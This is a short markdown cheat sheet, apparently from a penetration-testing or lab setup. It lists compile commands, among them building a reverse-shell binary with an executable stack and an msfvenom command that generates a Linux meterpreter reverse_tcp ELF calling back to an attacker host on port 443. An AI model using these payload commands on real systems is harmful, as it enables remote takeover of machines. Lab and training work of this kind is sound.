#### Use this command for compilling

Make sure compiler is installed
`sudo apt install musl-tools`

- when compiling normal file
`musl-gcc -static -Os -s -o test.elf test.c`
- when compiling reverseshell.
`musl-gcc -static -Os -s -o rev.elf rev.c -z execstack`

- Using msfvenom for elf payload
`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 prependfork=true -f elf  -o met.elf`
The prependfork=true option in Metasploit (specifically when using msfvenom) is a prepended shellcode command used to instruct the payload to fork itself into a new process upon execution.
